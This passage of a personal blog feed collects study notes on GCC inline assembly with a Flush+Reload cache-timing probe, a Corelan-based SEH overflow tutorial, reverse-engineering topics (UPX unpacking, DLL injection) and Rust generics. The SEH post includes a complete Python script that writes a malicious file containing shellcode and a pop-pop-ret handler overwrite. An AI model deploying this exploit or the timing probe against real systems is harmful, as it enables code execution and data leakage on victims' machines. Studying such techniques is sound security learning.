    <content type="html"><![CDATA[<h2 id="gcc-ARM内联汇编-与-预处理"><a href="#gcc-ARM内联汇编-与-预处理" class="headerlink" title="gcc ARM内联汇编 与 预处理"></a>gcc ARM内联汇编 与 预处理</h2><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>define 编译<code>预处理</code>时，对程序中所有出现的“宏名”，都用宏定义中的字符串去代换</p><p><code>#</code>开头都是预编译指令</p><a id="more"></a><pre><code>#ifndef HEADER_FILE#define HEADER_FILEthe entire header file file#endif</code></pre><p>这种结构就是通常所说的<code>包装器 #ifndef</code>。当再次引用头文件时，<code>条件为假</code>，因为 HEADER_FILE 已定义。此时，预处理器会<code>跳过</code>文件的整个内容，编译器会忽略它。</p><hr><p>您可以使用 typedef 为一个已有的类型取一个新的名字。下面是使用 typedef 定义一个新类型的语法：</p><pre><code>typedef struct config *config_t; //将config* 重新定为 config_ttypedef type newname; </code></pre><hr><h3 id="ARM内联汇编"><a href="#ARM内联汇编" class="headerlink" title="ARM内联汇编"></a>ARM内联汇编</h3><p>GCC编译器支持直接在C或者C++代码中，嵌入ARM汇编代码。其基本格式非常简单，大致如下：</p><pre><code>__asm__ [__volatile__] ( assembler template            : [output operand list]                  /* optional */           : [input operand list]                   /* optional */           : [clobbered register list]              /* optional */           );</code></pre><p>每一个操作数由下列组成</p><pre><code>[name]&quot;[modifier]constraint&quot;(C expression)</code></pre><p><code>name</code> 表示别名</p><p><code>限定符</code>constraint</p><pre><code>  &quot;a”将输入变量放入eax  &quot;b”将输入变量放入ebx“c”将输入变量放入ecx“d”将输入变量放入edx“s”将输入变量放入esi“d”将输入变量放入edi</code></pre><p>GCC中定义了三个<code>修改符</code>modifier，分别是：<br>修改符    含义</p><pre><code>=    只写操作数，通常用于输出操作数中+    可读且可写操作数，必须要列在输出操作数中&amp;    寄存器只能用于输出</code></pre><p>编译器并不会分析你的汇编代码，找出这种被你修改过，需要恢复的寄存器，因此你必须显式的告诉编译器，被你修改过的寄存器有哪些。这就是<code>修改寄存器列表</code>所起到的作用。<br><code>clobbered register list</code></p><h3 id="示例-flush-and-reload"><a href="#示例-flush-and-reload" class="headerlink" title="示例__flush and reload"></a>示例__flush and reload</h3><pre><code>/*SFENCE——串行化发生在SFENCE指令之前的写操作但是不影响读操作。    LFENCE——串行化发生在SFENCE指令之前的读操作但是不影响写操作。    MFENCE——串行化发生在MFENCE指令之前的读写操作。sfence:在sfence指令前的写操作当必须在sfence指令后的写操作前完成。lfence：在lfence指令前的读操作当必须在lfence指令后的读操作前完成。 no instruction fol-lowing it executes before thelfenceinstructionmfence：在mfence指令前的读写操作当必须在mfence指令后的读写操作前完成。*/</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">gettime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> tl;</span><br><span class="line">  <span class="keyword">asm</span> __volatile__(<span class="string">"lfence\nrdtsc"</span> : <span class="string">"=a"</span> (tl): : <span class="string">"%edx"</span>); <span class="comment">//“__volatile__”关键字，这个是可选的，</span></span><br><span class="line">  <span class="comment">//其作用是禁止编译器对后面编写的汇编指令再进行优化</span></span><br><span class="line">  <span class="keyword">return</span> tl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">probe</span><span class="params">(<span class="keyword">char</span> *adrs)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> time;</span><br><span class="line">    <span class="comment">//gcc arm</span></span><br><span class="line">  <span class="keyword">asm</span> __volatile__ (</span><br><span class="line">    <span class="string">"  mfence             \n"</span> <span class="comment">//cpuid (intel) 虚拟机会模拟该指令，导致时间增加</span></span><br><span class="line">    <span class="string">"  lfence             \n"</span></span><br><span class="line">    <span class="string">"  rdtsc              \n"</span></span><br><span class="line">    <span class="string">"  lfence             \n"</span> <span class="comment">//reads  the  64-bitcounter, returning the low 32 bits of the counter in%eax and the high 32 bits in%edx</span></span><br><span class="line">    <span class="string">"  movl %%eax, %%esi  \n"</span> <span class="comment">//把rdtsc返回的时间传入ESI保存</span></span><br><span class="line">    <span class="string">"  movl (%1), %%eax   \n"</span> <span class="comment">//%1表示adrs  reads  4  bytes  from  the  memory  address  in%ecx</span></span><br><span class="line">    <span class="string">"  lfence             \n"</span> <span class="comment">//（）表示指针</span></span><br><span class="line">    <span class="string">"  rdtsc              \n"</span></span><br><span class="line">    <span class="string">"  subl %%esi, %%eax  \n"</span> <span class="comment">//rdtsc返回值保存在eax.相减，结果保存在eax</span></span><br><span class="line">    <span class="string">"  clflush 0(%1)      \n"</span> <span class="comment">//()剔除缓存中的值</span></span><br><span class="line">    : <span class="string">"=a"</span> (time)</span><br><span class="line">    : <span class="string">"c"</span> (adrs)   <span class="comment">//c infer edc</span></span><br><span class="line">    :  <span class="string">"%esi"</span>, <span class="string">"%edx"</span>);</span><br><span class="line">  <span class="keyword">return</span> time;  <span class="comment">/*Loads shorter than the threshold are presumed tobe served from the cache, </span></span><br><span class="line"><span class="comment">                 indicating that another processhas accessed the memory line since it was last flushed5 from the cache*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;gcc-ARM内联汇编-与-预处理&quot;&gt;&lt;a href=&quot;#gcc-ARM内联汇编-与-预处理&quot; class=&quot;headerlink&quot; title=&quot;gcc ARM内联汇编 与 预处理&quot;&gt;&lt;/a&gt;gcc ARM内联汇编 与 预处理&lt;/h2&gt;&lt;h3 id=&quot;预处理&quot;&gt;&lt;a href=&quot;#预处理&quot; class=&quot;headerlink&quot; title=&quot;预处理&quot;&gt;&lt;/a&gt;预处理&lt;/h3&gt;&lt;p&gt;define 编译&lt;code&gt;预处理&lt;/code&gt;时，对程序中所有出现的“宏名”，都用宏定义中的字符串去代换&lt;/p&gt;
&lt;p&gt;&lt;code&gt;#&lt;/code&gt;开头都是预编译指令&lt;/p&gt;
    
    </summary>
    
    
      <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>SEH</title>
    <link href="http://finsenty54.github.io/2020/09/21/SEH/"/>
    <id>http://finsenty54.github.io/2020/09/21/SEH/</id>
    <published>2020-09-21T14:25:04.000Z</published>
    <updated>2020-09-21T14:25:59.079Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PWN学习"><a href="#PWN学习" class="headerlink" title="PWN学习"></a>PWN学习</h2><h4 id="Exploit-writing-tutorial-part-3-SEH-Based-Exploits"><a href="#Exploit-writing-tutorial-part-3-SEH-Based-Exploits" class="headerlink" title="Exploit writing tutorial part 3 : SEH Based Exploits"></a><a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" title="Exploit writing tutorial part 3 : SEH Based Exploits" target="_blank" rel="noopener">Exploit writing tutorial part 3 : SEH Based Exploits</a></h4><a id="more"></a><p><img src="https://s1.ax1x.com/2020/09/21/wq8cwV.png" alt="wq8cwV.png"><br>1st exception occurs :<br> |<br> ————————— (1)<br>                            |<br>                     ——-+————– (3) opcode in next SEH : jump over SE Handler to the shellcode<br>                     |      |             |<br>                     |      V             V<br>[ Junk buffer ][ next SEH ][ SE Handler ][ Shellcode ]<br>                opcode to   do                 (3) Shellcode gets executed<br>                jump over   pop pop ret<br>                SE Handler   |<br>                ^            |<br>                |            |<br>                ————– (2) will ‘pretend’ there’s a second exception, puts address of next SEH location in EIP, so opcode gets executed</p><p>当一个异常触发时，会建立自己的栈，push EH Handler的参数，在ESP+8处的EstablisherFrame指向下一个SEH，在这里写pop pop ret的地址</p><p>the <code>first pop</code> will take off<code>4 bytes</code> from the stack<br>the <code>second pop</code> will take another<code>4 bytes</code>from the stack<br>the <code>ret</code> will take the<code>current value</code>from the top of ESP ( = the address of the next SEH, which was at<code>ESP+8</code>, but because of the 2 pop’s now sits at the top of the stack) and puts that in <code>EIP</code>.</p><h5 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h5><p>ollydbg VIEW-SEH CHAIN</p><h5 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h5><p><code>msf-pattern_create -l 5000</code><br>产生一个序列，用于定位溢出点</p><p>msf5 &gt; msfpescan -p Player.dll | grep -v “000”<br>寻找pop pop ret 命令地址 -v 不匹配“000”</p><p>int 3 指令（0xcc） 中断指令</p><pre><code>import structuitext = &quot;ui_exploit.txt&quot;junk = &quot;\x41&quot; * 584seh_next = &quot;\xeb\x04\x90\x90&quot;seh_handler = str(struct.pack(&apos;&lt;L&apos;, 0x10018de8))shellcode = &quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49&quot; +\            &quot;\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36&quot; +\            &quot;\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34&quot; +\            &quot;\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41&quot; +\            &quot;\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44&quot; +\            &quot;\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37&quot; +\            &quot;\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48&quot; +\            &quot;\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48&quot; +\            &quot;\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c&quot; +\            &quot;\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e&quot; +\            &quot;\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48&quot; +\            &quot;\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54&quot; +\            &quot;\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48&quot; +\            &quot;\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43&quot; +\            &quot;\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57&quot; +\            &quot;\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a&quot; +\            &quot;\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b&quot; +\            &quot;\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53&quot; +\            &quot;\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37&quot; +\            &quot;\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49&quot; +\            &quot;\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46&quot; +\            &quot;\x4e\x36\x43\x46\x42\x50\x5a&quot;junk2 = &quot;\x90&quot; * 1000fp = open(uitext, &apos;w&apos;)content = junk + seh_next + seh_handler + shellcode + junk2fp.write(content)fp.close()</code></pre><p>总结：<br>SEH链条结构及其在栈中的位置<br>Windows XP SP1添加的XOR和SafeSEH保护机制<br>通过msf的msfpescan从dll中查找带有想要操作的函数（“POP POP RET”）<br>RET操作作为exploit方式的优缺点<br>通过<code>windbg</code>的”!analyze -v“ 和“!exchain”命令查看current SEH指针内容<br>windbg：d eip ; !exchain命令 ；u 地址 ；g 运行</p><p>frog 青蛙</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;PWN学习&quot;&gt;&lt;a href=&quot;#PWN学习&quot; class=&quot;headerlink&quot; title=&quot;PWN学习&quot;&gt;&lt;/a&gt;PWN学习&lt;/h2&gt;&lt;h4 id=&quot;Exploit-writing-tutorial-part-3-SEH-Based-Exploits&quot;&gt;&lt;a href=&quot;#Exploit-writing-tutorial-part-3-SEH-Based-Exploits&quot; class=&quot;headerlink&quot; title=&quot;Exploit writing tutorial part 3 : SEH Based Exploits&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/&quot; title=&quot;Exploit writing tutorial part 3 : SEH Based Exploits&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Exploit writing tutorial part 3 : SEH Based Exploits&lt;/a&gt;&lt;/h4&gt;
    
    </summary>
    
    
      <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>RCE 初探</title>
    <link href="http://finsenty54.github.io/2020/08/18/RCE%20%E5%88%9D%E6%8E%A2/"/>
    <id>http://finsenty54.github.io/2020/08/18/RCE 初探/</id>
    <published>2020-08-18T13:07:01.000Z</published>
    <updated>2020-08-18T13:07:58.509Z</updated>
    
    <content type="html"><![CDATA[<h4 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h4><p>upx == 加壳？<br>代码压缩器，执行时解码后运行<br>PS  .\upx.exe -1 -o notepad_upx.exe D:\RCE\notepad.exe</p><a id="more"></a><hr><p>段寄存器 16 位<br>DS 存放数据段的段基址</p><hr><p>每一个<code>内存单元的宽度为8位</code>。<br>[编号]称为地址。<br>内存单元：字节 <code>每个字节有个编号</code>，称为<code>内存地址</code></p><hr><p>dword ptr [esi+13000]=[notepad.01014000]=14D L’ō’</p><p>ds 寄存器没用？</p><hr><p>在栈中设置硬件断点 找到解壳后的OEP<br>具体在<code>PUSHAD</code>中设置硬件断点，指令完成后才暂停 ，也就是<code>POPAD</code> 完成后暂停 ，后面JMP跳转到<code>OEP</code> original EP</p><hr><p>exe默认00400000<br>dll 默认10000000</p><hr><h4 id="节对齐"><a href="#节对齐" class="headerlink" title="节对齐"></a>节对齐</h4><p>Alignment is <code>a rounded up value.</code> Section data size is rounded up for effeciency because the OS moves stuff around in chunks anyway.<br>The File Alignment is usually 512 bytes which fit the blocksize of most filesystems.<br>The Section Alignment is usually 4096 bytes which fit the size of a memory page.<br>So if you have a PE-file with a section (like “.text”) that contains<code>513</code> bytes of data:</p><p><code>不足的改为整数倍</code><br>Section .text will be rounded up to <code>1024</code> bytes on file.<br>Section .text will be rounded up to <code>4096</code>bytes in memory.<br>Note the amount of slack space possible both on file and in memory.</p><hr><h4 id="stud-pe"><a href="#stud-pe" class="headerlink" title="stud_pe"></a>stud_pe</h4><p>修改size of optional header值，向文件头插入解码代码<br>在选项头和节区头间插入代码<br>numberofRVAandSIZES表示data_directory结构体元素个数(有些没用，可以覆盖)</p><h4 id="inline-patch-内嵌补丁"><a href="#inline-patch-内嵌补丁" class="headerlink" title="inline patch 内嵌补丁"></a>inline patch 内嵌补丁</h4><p>将补丁代码放在空白块中</p><hr><p>变量名和函数名只是地址的一种助记符，当源文件被编译和链接成可执行程序后，它们都会被替换成地址。</p><p>取地址符&amp;</p><p>.text 的 size of raw data == 400 virtual size == 280 文件中400 加载到内存中只加了280<br>其他值时0x00</p><hr><p>image_scn_men_write 相应内存区的写权限</p><hr><h4 id="rep-movsb-命令"><a href="#rep-movsb-命令" class="headerlink" title="rep movsb 命令"></a>rep movsb 命令</h4><p> b==byte rep == repeats ECX 里大小 循环</p><h4 id="moves-命令"><a href="#moves-命令" class="headerlink" title="moves  命令"></a>moves  命令</h4><p>== ds:esi -&gt; ds:edi<br>decreasing CX, so at the end CX becomes zero.</p><h4 id="RCE经验"><a href="#RCE经验" class="headerlink" title="RCE经验"></a>RCE经验</h4><p>1 压缩器解码<br>2 区域双重加密 内嵌补丁</p><hr><h4 id="test-按位与"><a href="#test-按位与" class="headerlink" title="test 按位与"></a>test 按位与</h4><p>test eax, eax<br>eax==0 zf 设位1</p><hr><h4 id="Ret相当于-Pop-EIP"><a href="#Ret相当于-Pop-EIP" class="headerlink" title="Ret相当于 Pop EIP"></a>Ret相当于 Pop EIP</h4><hr><h4 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h4><p>threadProc 线程创建函数<br>用句柄控制相应进程<br>三种方法：<br>创建远程线程<br>钩子注入<br>设置里全局注入</p><p>SPaCIoS</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;UPX&quot;&gt;&lt;a href=&quot;#UPX&quot; class=&quot;headerlink&quot; title=&quot;UPX&quot;&gt;&lt;/a&gt;UPX&lt;/h4&gt;&lt;p&gt;upx == 加壳？&lt;br&gt;代码压缩器，执行时解码后运行&lt;br&gt;PS  .\upx.exe -1 -o notepad_upx.exe D:\RCE\notepad.exe&lt;/p&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>RUST学习4</title>
    <link href="http://finsenty54.github.io/2020/08/14/RUST%E5%AD%A6%E4%B9%A04/"/>
    <id>http://finsenty54.github.io/2020/08/14/RUST学习4/</id>
    <published>2020-08-14T04:26:23.000Z</published>
    <updated>2020-08-14T04:27:08.603Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Result-lt-T-E-gt"><a href="#Result-lt-T-E-gt" class="headerlink" title="Result&lt;T, E&gt;"></a>Result<code>&lt;T, E&gt;</code></h3><p>Rust doesn’t have exceptions. Instead, it has the type<code>Result&lt;T, E&gt;</code> for recoverable errors and the panic! macro that stops execution when the program encounters an unrecoverable error. </p><p>When the <code>panic!</code>macro executes, your program will print a failure message, unwind and clean up the stack, and then quit.<br><a id="more"></a><br>result enum is defined as having two variants<code>, Ok and Err,</code></p><p>The Result&lt;T, E&gt; type has many helper methods defined on it to do various tasks. One of those methods, called <code>unwrap</code>, is a shortcut method that is implemented <code>just like the match</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use std::fs::File;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let f = File::open(<span class="string">"hello.txt"</span>).unwrap();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use std::fs::File;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let f = File::open(<span class="string">"hello.txt"</span>).expect(<span class="string">"Failed to open hello.txt"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Propagating Errors<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123;</span><br><span class="line">let f = File::open(<span class="string">"hello.txt"</span>);</span><br><span class="line"></span><br><span class="line">    let mut f = match f &#123;</span><br><span class="line">        Ok(file) =&gt; file,</span><br><span class="line">        Err(e) =&gt; <span class="keyword">return</span> Err(e),</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></p><p>A Shortcut for Propagating Errors: the ? Operator<br>The<code>?</code>placed after a Result value is defined to work in almost the same way as the match expressions </p><p> If the value of the Result is an Ok, the value inside the Ok will get returned from this expression, and the program will continue. If the value is an Err, the Err will be returned from the whole function as if we had used the return keyword so the error value gets propagated to the calling code.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File::open(<span class="string">"hello.txt"</span>)<span class="string">?.</span>read_to_string(&amp;mut s)?;</span><br><span class="line">Ok(s)</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123;</span><br><span class="line">    fs::read_to_string(<span class="string">"hello.txt"</span>)</span><br></pre></td></tr></table></figure><p> If you can ensure by manually inspecting the code that you’ll never have an Err variant, it’s perfectly acceptable to call<code>unwrap.</code> Here’s an example:</p><h3 id="Generic-泛型"><a href="#Generic-泛型" class="headerlink" title="Generic 泛型"></a>Generic 泛型</h3><p>将代码抽取出来，减少重复代码<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fn largest&lt;T&gt;(<span class="symbol">list:</span> &amp;[T]) -&gt; T &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct Point&lt;T, U&gt; &#123; <span class="regexp">//</span>T U代表不同的类型</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> U,</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    let both_integer = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10</span> &#125;;</span><br><span class="line">    let both_float = Point &#123; <span class="symbol">x:</span> <span class="number">1.0</span>, <span class="symbol">y:</span> <span class="number">4.0</span> &#125;;</span><br><span class="line">    let integer_and_float = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">4.0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>where T was filled in with the type std::fs::File when the file was opened successfully and E was filled in with the type std::io::Error when there were problems opening the file.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">struct Point&lt;T&gt; &#123;</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> T,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl&lt;T&gt; Point&lt;T&gt; &#123;</span><br><span class="line">    fn x(&amp;<span class="keyword">self</span>) -&gt; &amp;T &#123;</span><br><span class="line">        &amp;<span class="keyword">self</span>.x</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let p = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10</span> &#125;;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"p.x = &#123;&#125;"</span>, p.x());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Note that we have to declare <code>T just after impl</code>so we can use it to specify that we’re implementing methods on the type Point<t>.</t></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">struct Point&lt;T, U&gt; &#123;</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> U,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl&lt;T, U&gt; Point&lt;T, U&gt; &#123;</span><br><span class="line">    fn mixup&lt;V, W&gt;(<span class="keyword">self</span>, <span class="symbol">other:</span> Point&lt;V, W&gt;) -&gt; Point&lt;T, W&gt; &#123;</span><br><span class="line">        Point &#123;</span><br><span class="line">            <span class="symbol">x:</span> <span class="keyword">self</span>.x,</span><br><span class="line">            <span class="symbol">y:</span> other.y,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let p1 = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10.4</span> &#125;;</span><br><span class="line">    let p2 = Point &#123; <span class="symbol">x:</span> <span class="string">"Hello"</span>, <span class="symbol">y:</span> <span class="string">'c'</span> &#125;;</span><br><span class="line"></span><br><span class="line">    let p3 = p1.mixup(p2);</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"p3.x = &#123;&#125;, p3.y = &#123;&#125;"</span>, p3.x, p3.y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="traits"><a href="#traits" class="headerlink" title="traits"></a>traits</h3><p>Different types share the same behavior if we can call the same methods on all of those types. Trait definitions are a way to group method signatures together to define a set of behaviors necessary to accomplish some purpose.</p><p>Each type implementing this trait must provide<code>its own custom behavior</code>for the body of the method.<br><code>相当于提供一个接口，具体内容自己实现</code><br>与Java一个概念类似</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct NewsArticle &#123;</span><br><span class="line">    pub <span class="symbol">headline:</span> String,</span><br><span class="line">    pub <span class="symbol">location:</span> String,</span><br><span class="line">    pub <span class="symbol">author:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> NewsArticle &#123; <span class="regexp">//</span>添加trait到结构中</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">"&#123;&#125;, by &#123;&#125; (&#123;&#125;)"</span>, <span class="keyword">self</span>.headline, <span class="keyword">self</span>.author, <span class="keyword">self</span>.location)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct Tweet &#123;</span><br><span class="line">    pub <span class="symbol">username:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">    pub <span class="symbol">reply:</span> bool,</span><br><span class="line">    pub <span class="symbol">retweet:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> Tweet &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">"&#123;&#125;: &#123;&#125;"</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.content)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 